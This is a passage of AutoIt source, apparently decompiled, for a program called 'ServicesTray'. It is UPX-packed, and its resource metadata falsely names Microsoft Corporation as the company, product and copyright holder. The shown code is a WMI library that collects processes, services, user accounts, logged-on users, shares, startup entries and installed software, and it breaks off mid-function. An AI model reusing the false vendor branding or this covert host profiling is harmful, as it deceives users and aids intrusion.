#Region
	#AutoIt3Wrapper_UseUpx=y
	#AutoIt3Wrapper_Res_Comment=services tray
	#AutoIt3Wrapper_Res_Description=ServicesTray
	#AutoIt3Wrapper_Res_Fileversion=13.3.1223.2
	#AutoIt3Wrapper_Res_ProductName=Microsoft Windows Operating System
	#AutoIt3Wrapper_Res_ProductVersion=13.3.1223.2
	#AutoIt3Wrapper_Res_CompanyName=Microsoft Windows Operating System
	#AutoIt3Wrapper_Res_LegalCopyright=© Microsoft Corporation. All rights reserved.
	#AutoIt3Wrapper_Res_LegalTradeMarks=© Microsoft Corporation. All rights reserved.
	#AutoIt3Wrapper_Run_Tidy=y
	#AutoIt3Wrapper_Run_Au3Stripper=y
#EndRegion
#Region Header
#EndRegion Header
#Region Global Variables and Constants
	If NOT (IsDeclared("$cI_CompName")) Then
		Global $ci_compname = @ComputerName
	EndIf
	Global Const $ci_versioninfo = "00.03.08"
	Global Const $ci_aname = 0, $ci_adesc = 4
	Global $wbemflagreturnimmediately = 16, $wbemflagforwardonly = 32
	Global $err_no_info = "Array contains no information", $err_not_obj = "$colItems isnt an object"
#EndRegion Global Variables and Constants
#Region Software Functions

	Func _computergetbootconfig(ByRef $abootconfiginfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $abootconfiginfo[1][8], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_BootConfiguration", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $abootconfiginfo[UBound($abootconfiginfo) + 1][8]
				$abootconfiginfo[$i][0] = $objitem.name
				$abootconfiginfo[$i][1] = $objitem.bootdirectory
				$abootconfiginfo[$i][2] = $objitem.configurationpath
				$abootconfiginfo[$i][3] = $objitem.lastdrive
				$abootconfiginfo[$i][4] = $objitem.description
				$abootconfiginfo[$i][5] = $objitem.scratchdirectory
				$abootconfiginfo[$i][6] = $objitem.settingid
				$abootconfiginfo[$i][7] = $objitem.tempdirectory
				$i += 1
			Next
			$abootconfiginfo[0][0] = UBound($abootconfiginfo) - 1
			If $abootconfiginfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetdependantservices(ByRef $adependantserviceinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $adependantserviceinfo[1][3], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_DependentService", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $adependantserviceinfo[UBound($adependantserviceinfo) + 1][3]
				$adependantserviceinfo[$i][0] = $objitem.antecedent
				$adependantserviceinfo[$i][1] = $objitem.dependent
				$adependantserviceinfo[$i][2] = $objitem.typeofdependency
				$i += 1
			Next
			$adependantserviceinfo[0][0] = UBound($adependantserviceinfo) - 1
			If $adependantserviceinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetdesktops(ByRef $adesktopinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $adesktopinfo[1][20], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Desktop", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $adesktopinfo[UBound($adesktopinfo) + 1][20]
				$adesktopinfo[$i][0] = $objitem.name
				$adesktopinfo[$i][1] = $objitem.borderwidth
				$adesktopinfo[$i][2] = $objitem.coolswitch
				$adesktopinfo[$i][3] = $objitem.cursorblinkrate
				$adesktopinfo[$i][4] = $objitem.description
				$adesktopinfo[$i][5] = $objitem.dragfullwindows
				$adesktopinfo[$i][6] = $objitem.gridgranularity
				$adesktopinfo[$i][7] = $objitem.iconspacing
				$adesktopinfo[$i][8] = $objitem.icontitlefacename
				$adesktopinfo[$i][9] = $objitem.icontitlesize
				$adesktopinfo[$i][10] = $objitem.icontitlewrap
				$adesktopinfo[$i][11] = $objitem.pattern
				$adesktopinfo[$i][12] = $objitem.screensaveractive
				$adesktopinfo[$i][13] = $objitem.screensaverexecutable
				$adesktopinfo[$i][14] = $objitem.screensaversecure
				$adesktopinfo[$i][15] = $objitem.screensavertimeout
				$adesktopinfo[$i][16] = $objitem.settingid
				$adesktopinfo[$i][17] = $objitem.wallpaper
				$adesktopinfo[$i][18] = $objitem.wallpaperstretched
				$adesktopinfo[$i][19] = $objitem.wallpapertiled
				$i += 1
			Next
			$adesktopinfo[0][0] = UBound($adesktopinfo) - 1
			If $adesktopinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergeteventlogs(ByRef $aeventloginfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aeventloginfo[1][38], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_NTEventLogFile", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aeventloginfo[UBound($aeventloginfo) + 1][38]
				$aeventloginfo[$i][0] = $objitem.name
				$aeventloginfo[$i][1] = $objitem.accessmask
				$aeventloginfo[$i][2] = $objitem.archive
				$aeventloginfo[$i][3] = $objitem.compressed
				$aeventloginfo[$i][4] = $objitem.description
				$aeventloginfo[$i][5] = $objitem.compressionmethod
				$aeventloginfo[$i][6] = $objitem.creationclassname
				$aeventloginfo[$i][7] = __stringtodate($objitem.creationdate)
				$aeventloginfo[$i][8] = $objitem.cscreationclassname
				$aeventloginfo[$i][9] = $objitem.csname
				$aeventloginfo[$i][10] = $objitem.drive
				$aeventloginfo[$i][11] = $objitem.eightdotthreefilename
				$aeventloginfo[$i][12] = $objitem.encrypted
				$aeventloginfo[$i][13] = $objitem.encryptionmethod
				$aeventloginfo[$i][14] = $objitem.extension
				$aeventloginfo[$i][15] = $objitem.filename
				$aeventloginfo[$i][16] = $objitem.filesize
				$aeventloginfo[$i][17] = $objitem.filetype
				$aeventloginfo[$i][18] = $objitem.fscreationclassname
				$aeventloginfo[$i][19] = $objitem.fsname
				$aeventloginfo[$i][20] = $objitem.hidden
				$aeventloginfo[$i][21] = __stringtodate($objitem.installdate)
				$aeventloginfo[$i][22] = $objitem.inusecount
				$aeventloginfo[$i][23] = __stringtodate($objitem.lastaccessed)
				$aeventloginfo[$i][24] = __stringtodate($objitem.lastmodified)
				$aeventloginfo[$i][25] = $objitem.logfilename
				$aeventloginfo[$i][26] = $objitem.manufacturer
				$aeventloginfo[$i][27] = $objitem.maxfilesize
				$aeventloginfo[$i][28] = $objitem.numberofrecords
				$aeventloginfo[$i][29] = $objitem.overwriteoutdated
				$aeventloginfo[$i][30] = $objitem.overwritepolicy
				$aeventloginfo[$i][31] = $objitem.path
				$aeventloginfo[$i][32] = $objitem.readable
				$aeventloginfo[$i][33] = $objitem.sources(0)
				$aeventloginfo[$i][34] = $objitem.status
				$aeventloginfo[$i][35] = $objitem.system
				$aeventloginfo[$i][36] = $objitem.version
				$aeventloginfo[$i][37] = $objitem.writeable
				$i += 1
			Next
			$aeventloginfo[0][0] = UBound($aeventloginfo) - 1
			If $aeventloginfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetextensions(ByRef $aextensioninfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aextensioninfo[1][16], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_ExtensionInfoAction", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aextensioninfo[UBound($aextensioninfo) + 1][16]
				$aextensioninfo[$i][0] = $objitem.name
				$aextensioninfo[$i][1] = $objitem.actionid
				$aextensioninfo[$i][2] = $objitem.argument
				$aextensioninfo[$i][3] = $objitem.command
				$aextensioninfo[$i][4] = $objitem.description
				$aextensioninfo[$i][5] = $objitem.direction
				$aextensioninfo[$i][6] = $objitem.extension
				$aextensioninfo[$i][7] = $objitem.mime
				$aextensioninfo[$i][8] = $objitem.progid
				$aextensioninfo[$i][9] = $objitem.shellnew
				$aextensioninfo[$i][10] = $objitem.shellnewvalue
				$aextensioninfo[$i][11] = $objitem.softwareelementid
				$aextensioninfo[$i][12] = $objitem.softwareelementstate
				$aextensioninfo[$i][13] = $objitem.targetoperatingsystem
				$aextensioninfo[$i][14] = $objitem.verb
				$aextensioninfo[$i][15] = $objitem.version
				$i += 1
			Next
			$aextensioninfo[0][0] = UBound($aextensioninfo) - 1
			If $aextensioninfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetgroups(ByRef $agroupinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $agroupinfo[1][7], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Group", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $agroupinfo[UBound($agroupinfo) + 1][7]
				$agroupinfo[$i][0] = $objitem.name
				$agroupinfo[$i][1] = $objitem.domain
				$agroupinfo[$i][2] = $objitem.status
				$agroupinfo[$i][3] = $objitem.localaccount
				$agroupinfo[$i][4] = $objitem.description
				$agroupinfo[$i][5] = $objitem.sid
				$agroupinfo[$i][6] = $objitem.sidtype
				$i += 1
			Next
			$agroupinfo[0][0] = UBound($agroupinfo) - 1
			If $agroupinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetloggedonusers(ByRef $aloggedonuserinfo)
		Local $colitems, $objwmiservice, $objitem
		Local $loggedonuserinfo, $linepattern, $aexpret
		Dim $aloggedonuserinfo[1][3], $i = 1
		$linepattern = '(?i)(?:=")([^"]*)'
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_LoggedOnUser", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				$loggedonuserinfo &= $objitem.antecedent
				$loggedonuserinfo &= $objitem.dependent
			Next
			$aexpret = StringRegExp($loggedonuserinfo, $linepattern, 3)
			ReDim $aloggedonuserinfo[UBound($aexpret) / 3 + 1][3]
			Local $j = 0
			For $i = 1 To UBound($aloggedonuserinfo) - 1 Step 1
				$aloggedonuserinfo[$i][0] = $aexpret[$j]
				$aloggedonuserinfo[$i][1] = $aexpret[$j + 1]
				$aloggedonuserinfo[$i][2] = $aexpret[$j + 2]
				$j += 3
			Next
			$aloggedonuserinfo[0][0] = UBound($aloggedonuserinfo) - 1
			If $aloggedonuserinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetoss(ByRef $aosinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aosinfo[1][60], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_OperatingSystem", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aosinfo[UBound($aosinfo) + 1][60]
				$aosinfo[$i][0] = $objitem.name
				$aosinfo[$i][1] = $objitem.bootdevice
				$aosinfo[$i][2] = $objitem.buildnumber
				$aosinfo[$i][3] = $objitem.buildtype
				$aosinfo[$i][4] = $objitem.description
				$aosinfo[$i][5] = $objitem.codeset
				$aosinfo[$i][6] = $objitem.countrycode
				$aosinfo[$i][7] = $objitem.creationclassname
				$aosinfo[$i][8] = $objitem.cscreationclassname
				$aosinfo[$i][9] = $objitem.csdversion
				$aosinfo[$i][10] = $objitem.csname
				$aosinfo[$i][11] = $objitem.currenttimezone
				$aosinfo[$i][12] = $objitem.dataexecutionprevention_32bitapplications
				$aosinfo[$i][13] = $objitem.dataexecutionprevention_available
				$aosinfo[$i][14] = $objitem.dataexecutionprevention_drivers
				$aosinfo[$i][15] = $objitem.dataexecutionprevention_supportpolicy
				$aosinfo[$i][16] = $objitem.debug
				$aosinfo[$i][17] = $objitem.distributed
				$aosinfo[$i][18] = $objitem.encryptionlevel
				$aosinfo[$i][19] = $objitem.foregroundapplicationboost
				$aosinfo[$i][20] = $objitem.freephysicalmemory
				$aosinfo[$i][21] = $objitem.freespaceinpagingfiles
				$aosinfo[$i][22] = $objitem.freevirtualmemory
				$aosinfo[$i][23] = __stringtodate($objitem.installdate)
				$aosinfo[$i][24] = $objitem.largesystemcache
				$aosinfo[$i][25] = __stringtodate($objitem.lastbootuptime)
				$aosinfo[$i][26] = __stringtodate($objitem.localdatetime)
				$aosinfo[$i][27] = $objitem.locale
				$aosinfo[$i][28] = $objitem.manufacturer
				$aosinfo[$i][29] = $objitem.maxnumberofprocesses
				$aosinfo[$i][30] = $objitem.maxprocessmemorysize
				$aosinfo[$i][31] = $objitem.numberoflicensedusers
				$aosinfo[$i][32] = $objitem.numberofprocesses
				$aosinfo[$i][33] = $objitem.numberofusers
				$aosinfo[$i][34] = $objitem.organization
				$aosinfo[$i][35] = $objitem.oslanguage
				$aosinfo[$i][36] = $objitem.osproductsuite
				$aosinfo[$i][37] = $objitem.ostype
				$aosinfo[$i][38] = $objitem.othertypedescription
				$aosinfo[$i][39] = $objitem.plusproductid
				$aosinfo[$i][40] = $objitem.plusversionnumber
				$aosinfo[$i][41] = $objitem.primary
				$aosinfo[$i][42] = $objitem.producttype
				$aosinfo[$i][45] = $objitem.registereduser
				$aosinfo[$i][46] = $objitem.serialnumber
				$aosinfo[$i][47] = $objitem.servicepackmajorversion
				$aosinfo[$i][48] = $objitem.servicepackminorversion
				$aosinfo[$i][49] = $objitem.sizestoredinpagingfiles
				$aosinfo[$i][50] = $objitem.status
				$aosinfo[$i][51] = $objitem.suitemask
				$aosinfo[$i][52] = $objitem.systemdevice
				$aosinfo[$i][53] = $objitem.systemdirectory
				$aosinfo[$i][54] = $objitem.systemdrive
				$aosinfo[$i][55] = $objitem.totalswapspacesize
				$aosinfo[$i][56] = $objitem.totalvirtualmemorysize
				$aosinfo[$i][57] = $objitem.totalvisiblememorysize
				$aosinfo[$i][58] = $objitem.version
				$aosinfo[$i][59] = $objitem.windowsdirectory
				$i += 1
			Next
			$aosinfo[0][0] = UBound($aosinfo) - 1
			If $aosinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetprintjobs(ByRef $aprintjobinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aprintjobinfo[1][23], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_PrintJob", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aprintjobinfo[UBound($aprintjobinfo) + 1][23]
				$aprintjobinfo[$i][0] = $objitem.name
				$aprintjobinfo[$i][1] = $objitem.datatype
				$aprintjobinfo[$i][2] = $objitem.document
				$aprintjobinfo[$i][3] = $objitem.drivername
				$aprintjobinfo[$i][4] = $objitem.description
				$aprintjobinfo[$i][5] = __stringtodate($objitem.elapsedtime)
				$aprintjobinfo[$i][6] = $objitem.hostprintqueue
				$aprintjobinfo[$i][7] = $objitem.jobid
				$aprintjobinfo[$i][8] = $objitem.jobstatus
				$aprintjobinfo[$i][9] = $objitem.name
				$aprintjobinfo[$i][10] = $objitem.notify
				$aprintjobinfo[$i][11] = $objitem.owner
				$aprintjobinfo[$i][12] = $objitem.pagesprinted
				$aprintjobinfo[$i][13] = $objitem.parameters
				$aprintjobinfo[$i][14] = $objitem.printprocessor
				$aprintjobinfo[$i][15] = $objitem.priority
				$aprintjobinfo[$i][16] = $objitem.size
				$aprintjobinfo[$i][17] = __stringtodate($objitem.starttime)
				$aprintjobinfo[$i][18] = $objitem.status
				$aprintjobinfo[$i][19] = $objitem.statusmask
				$aprintjobinfo[$i][20] = __stringtodate($objitem.timesubmitted)
				$aprintjobinfo[$i][21] = $objitem.totalpages
				$aprintjobinfo[$i][22] = __stringtodate($objitem.untiltime)
				$i += 1
			Next
			$aprintjobinfo[0][0] = UBound($aprintjobinfo) - 1
			If $aprintjobinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetprocesses(ByRef $aprocessinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aprocessinfo[1][42], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Process", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aprocessinfo[UBound($aprocessinfo) + 1][42]
				$aprocessinfo[$i][0] = $objitem.name
				$aprocessinfo[$i][1] = $objitem.commandline
				$aprocessinfo[$i][2] = $objitem.creationclassname
				$aprocessinfo[$i][3] = __stringtodate($objitem.creationdate)
				$aprocessinfo[$i][4] = $objitem.description
				$aprocessinfo[$i][5] = $objitem.cscreationclassname
				$aprocessinfo[$i][6] = $objitem.csname
				$aprocessinfo[$i][7] = $objitem.executablepath
				$aprocessinfo[$i][8] = $objitem.executionstate
				$aprocessinfo[$i][9] = $objitem.handle
				$aprocessinfo[$i][10] = $objitem.handlecount
				$aprocessinfo[$i][11] = $objitem.kernelmodetime
				$aprocessinfo[$i][12] = $objitem.maximumworkingsetsize
				$aprocessinfo[$i][13] = $objitem.minimumworkingsetsize
				$aprocessinfo[$i][14] = $objitem.oscreationclassname
				$aprocessinfo[$i][15] = $objitem.osname
				$aprocessinfo[$i][16] = $objitem.otheroperationcount
				$aprocessinfo[$i][17] = $objitem.othertransfercount
				$aprocessinfo[$i][18] = $objitem.pagefaults
				$aprocessinfo[$i][19] = $objitem.pagefileusage
				$aprocessinfo[$i][20] = $objitem.parentprocessid
				$aprocessinfo[$i][21] = $objitem.peakpagefileusage
				$aprocessinfo[$i][22] = $objitem.peakvirtualsize
				$aprocessinfo[$i][23] = $objitem.peakworkingsetsize
				$aprocessinfo[$i][24] = $objitem.priority
				$aprocessinfo[$i][25] = $objitem.privatepagecount
				$aprocessinfo[$i][26] = $objitem.processid
				$aprocessinfo[$i][27] = $objitem.quotanonpagedpoolusage
				$aprocessinfo[$i][28] = $objitem.quotapagedpoolusage
				$aprocessinfo[$i][29] = $objitem.quotapeaknonpagedpoolusage
				$aprocessinfo[$i][30] = $objitem.quotapeakpagedpoolusage
				$aprocessinfo[$i][31] = $objitem.readoperationcount
				$aprocessinfo[$i][32] = $objitem.readtransfercount
				$aprocessinfo[$i][33] = $objitem.sessionid
				$aprocessinfo[$i][34] = $objitem.status
				$aprocessinfo[$i][35] = $objitem.threadcount
				$aprocessinfo[$i][36] = $objitem.usermodetime
				$aprocessinfo[$i][37] = $objitem.virtualsize
				$aprocessinfo[$i][38] = $objitem.windowsversion
				$aprocessinfo[$i][39] = $objitem.workingsetsize
				$aprocessinfo[$i][40] = $objitem.writeoperationcount
				$aprocessinfo[$i][41] = $objitem.writetransfercount
				$i += 1
			Next
			$aprocessinfo[0][0] = UBound($aprocessinfo) - 1
			If $aprocessinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetservices(ByRef $aservicesinfo, $sstate = "All")
		Local $ci_compname = @ComputerName, $wbemflagreturnimmediately = 16, $wbemflagforwardonly = 32
		Local $colitems, $objwmiservice, $objitem
		Dim $aservicesinfo[1][23], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Service", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				If $sstate <> "All" Then
					If $sstate = "Stopped" AND $objitem.state <> "Stopped" Then ContinueLoop
					If $sstate = "Running" AND $objitem.state <> "Running" Then ContinueLoop
				EndIf
				ReDim $aservicesinfo[UBound($aservicesinfo) + 1][23]
				$aservicesinfo[$i][0] = $objitem.name
				$aservicesinfo[$i][1] = $objitem.acceptpause
				$aservicesinfo[$i][2] = $objitem.acceptstop
				$aservicesinfo[$i][3] = $objitem.checkpoint
				$aservicesinfo[$i][4] = $objitem.description
				$aservicesinfo[$i][5] = $objitem.creationclassname
				$aservicesinfo[$i][6] = $objitem.desktopinteract
				$aservicesinfo[$i][7] = $objitem.displayname
				$aservicesinfo[$i][8] = $objitem.errorcontrol
				$aservicesinfo[$i][9] = $objitem.exitcode
				$aservicesinfo[$i][10] = $objitem.pathname
				$aservicesinfo[$i][11] = $objitem.processid
				$aservicesinfo[$i][12] = $objitem.servicespecificexitcode
				$aservicesinfo[$i][13] = $objitem.servicetype
				$aservicesinfo[$i][14] = $objitem.started
				$aservicesinfo[$i][15] = $objitem.startmode
				$aservicesinfo[$i][16] = $objitem.startname
				$aservicesinfo[$i][17] = $objitem.state
				$aservicesinfo[$i][18] = $objitem.status
				$aservicesinfo[$i][19] = $objitem.systemcreationclassname
				$aservicesinfo[$i][20] = $objitem.systemname
				$aservicesinfo[$i][21] = $objitem.tagid
				$aservicesinfo[$i][22] = $objitem.waithint
				$i += 1
			Next
			$aservicesinfo[0][0] = UBound($aservicesinfo) - 1
			If $aservicesinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetshares(ByRef $ashareinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $ashareinfo[1][8], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Share", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $ashareinfo[UBound($ashareinfo) + 1][8]
				$ashareinfo[$i][0] = $objitem.name
				$ashareinfo[$i][1] = $objitem.accessmask
				$ashareinfo[$i][2] = $objitem.allowmaximum
				$ashareinfo[$i][3] = $objitem.maximumallowed
				$ashareinfo[$i][4] = $objitem.description
				$ashareinfo[$i][5] = $objitem.path
				$ashareinfo[$i][6] = $objitem.status
				$ashareinfo[$i][7] = $objitem.type
				$i += 1
			Next
			$ashareinfo[0][0] = UBound($ashareinfo) - 1
			If $ashareinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetsoftware(ByRef $asoftwareinfo)
		Local Const $uninstkey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
		Local $i = 1
		Dim $asoftwareinfo[1][4]
		While 1
			$appkey = RegEnumKey($uninstkey, $i)
			If @error <> 0 Then ExitLoop
			ReDim $asoftwareinfo[UBound($asoftwareinfo) + 1][4]
			$asoftwareinfo[$i][0] = StringStripWS(StringReplace(RegRead($uninstkey & "\" & $appkey, "DisplayName"), " (remove only)", ""), 3)
			$asoftwareinfo[$i][1] = StringStripWS(RegRead($uninstkey & "\" & $appkey, "DisplayVersion"), 3)
			$asoftwareinfo[$i][2] = StringStripWS(RegRead($uninstkey & "\" & $appkey, "Publisher"), 3)
			$asoftwareinfo[$i][3] = StringStripWS(RegRead($uninstkey & "\" & $appkey, "UninstallString"), 3)
			$i += 1
		WEnd
		$asoftwareinfo[0][0] = UBound($asoftwareinfo, 1) - 1
		If $asoftwareinfo[0][0] < 1 Then
			SetError(1, 1, 0)
		EndIf
	EndFunc

	Func _computergetstartup(ByRef $astartupinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $astartupinfo[1][6], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_StartupCommand", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $astartupinfo[UBound($astartupinfo) + 1][6]
				$astartupinfo[$i][0] = $objitem.name
				$astartupinfo[$i][1] = $objitem.user
				$astartupinfo[$i][2] = $objitem.location
				$astartupinfo[$i][3] = $objitem.command
				$astartupinfo[$i][4] = $objitem.description
				$astartupinfo[$i][5] = $objitem.settingid
				$i += 1
			Next
			$astartupinfo[0][0] = UBound($astartupinfo) - 1
			If $astartupinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetthreads(ByRef $athreadinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $athreadinfo[1][20], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Thread", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $athreadinfo[UBound($athreadinfo) + 1][20]
				$athreadinfo[$i][0] = $objitem.name
				$athreadinfo[$i][1] = $objitem.creationclassname
				$athreadinfo[$i][2] = $objitem.cscreationclassname
				$athreadinfo[$i][3] = $objitem.csname
				$athreadinfo[$i][4] = $objitem.description
				$athreadinfo[$i][5] = $objitem.elapsedtime
				$athreadinfo[$i][6] = $objitem.executionstate
				$athreadinfo[$i][7] = $objitem.handle
				$athreadinfo[$i][8] = $objitem.kernelmodetime
				$athreadinfo[$i][9] = $objitem.oscreationclassname
				$athreadinfo[$i][10] = $objitem.osname
				$athreadinfo[$i][11] = $objitem.priority
				$athreadinfo[$i][12] = $objitem.prioritybase
				$athreadinfo[$i][13] = $objitem.processcreationclassname
				$athreadinfo[$i][14] = $objitem.processhandle
				$athreadinfo[$i][15] = $objitem.startaddress
				$athreadinfo[$i][16] = $objitem.status
				$athreadinfo[$i][17] = $objitem.threadstate
				$athreadinfo[$i][18] = $objitem.threadwaitreason
				$athreadinfo[$i][19] = $objitem.usermodetime
				$i += 1
			Next
			$athreadinfo[0][0] = UBound($athreadinfo) - 1
			If $athreadinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetusers(ByRef $auserinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $auserinfo[1][14], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_UserAccount", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $auserinfo[UBound($auserinfo) + 1][14]
				$auserinfo[$i][0] = $objitem.name
				$auserinfo[$i][1] = $objitem.domain
				$auserinfo[$i][2] = $objitem.status
				$auserinfo[$i][3] = $objitem.localaccount
				$auserinfo[$i][4] = $objitem.description
				$auserinfo[$i][5] = $objitem.sidtype
				$auserinfo[$i][6] = $objitem.sid
				$auserinfo[$i][7] = $objitem.fullname
				$auserinfo[$i][8] = $objitem.disabled
				$auserinfo[$i][9] = $objitem.lockout
				$auserinfo[$i][10] = $objitem.passwordchangeable
				$auserinfo[$i][11] = $objitem.passwordexpires
				$auserinfo[$i][12] = $objitem.passwordrequired
				$auserinfo[$i][13] = $objitem.accounttype
				$i += 1
			Next
			$auserinfo[0][0] = UBound($auserinfo) - 1
			If $auserinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

#EndRegion Software Functions
#Region Hardware Functions

	Func _computergetbattery(ByRef $abatteryinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $abatteryinfo[1][31], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Battery", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $abatteryinfo[UBound($abatteryinfo) + 1][31]
				$abatteryinfo[$i][0] = $objitem.name
				$abatteryinfo[$i][1] = $objitem.availability
				$abatteryinfo[$i][2] = $objitem.batteryrechargetime
				$abatteryinfo[$i][3] = $objitem.batterystatus
				$abatteryinfo[$i][4] = $objitem.description
				$abatteryinfo[$i][5] = $objitem.chemistry
				$abatteryinfo[$i][6] = $objitem.configmanagererrorcode
				$abatteryinfo[$i][7] = $objitem.configmanageruserconfig
				$abatteryinfo[$i][8] = $objitem.creationclassname
				$abatteryinfo[$i][9] = $objitem.designcapacity
				$abatteryinfo[$i][10] = $objitem.designvoltage
				$abatteryinfo[$i][11] = $objitem.deviceid
				$abatteryinfo[$i][12] = $objitem.errorcleared
